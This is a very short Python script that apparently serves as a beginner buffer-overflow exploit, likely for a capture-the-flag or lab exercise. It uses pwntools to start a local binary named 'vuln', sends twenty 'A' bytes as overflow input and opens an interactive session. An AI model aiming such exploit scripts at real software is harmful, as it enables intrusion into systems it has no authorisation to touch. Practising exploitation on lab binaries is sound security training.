from pwn import *

buff = b"A"*20

p =  process("./vuln")
p.recvline()

p.sendline(buff)

p.interactive()
